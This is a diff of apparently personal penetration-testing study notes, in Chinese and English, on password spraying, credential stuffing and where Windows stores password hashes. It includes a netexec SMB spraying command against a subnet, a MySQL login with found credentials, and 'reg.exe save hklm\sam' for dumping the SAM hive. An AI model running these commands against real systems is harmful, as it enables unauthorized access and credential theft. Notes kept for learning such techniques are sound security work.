@@ -129,11 +129,6 @@ Password spraying:
 单密码，多用户
 netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
 
-  Linux:
-    https://portswigger.net/burp/communitydownload
-  Windows:
-    https://github.com/ropnop/kerbrute
-
 
 Credential stuffing:
 单用户密码，多服务
@@ -148,16 +143,18 @@ creds search mysql        找 mysql，superdba:admin
 mysql -h localhost -usuperdba -padmin
 
 
-Where to find pwd hashes:
+Where to find pswd hash:
   1. SAM
   2. NTDS.dit
   3. in ram (lsass.exe)
 
 
-Windows::
-  HKLM\SAM  local hash of creds hash
-  HKLM\SYSTEM  key to hash SAM
-  HKLM\SECURITY domain and more
+Windows安全系统
+SAM文件，用于存储用户帐户凭据
+位于 %SystemRoot%\system32\config\SAM，并挂载在 HKLM\SAM     %SystemRoot% 是环境变量，通常展开为 C:\Windows，HKLM\SAM 是注册表一个键
+  HKLM\SAM           本地用户哈希
+  HKLM\SYSTEM        系统哈希
+  HKLM\SECURITY      域用户和服务哈希
 
   reg.exe save hklm\sam C:\sam.save
 
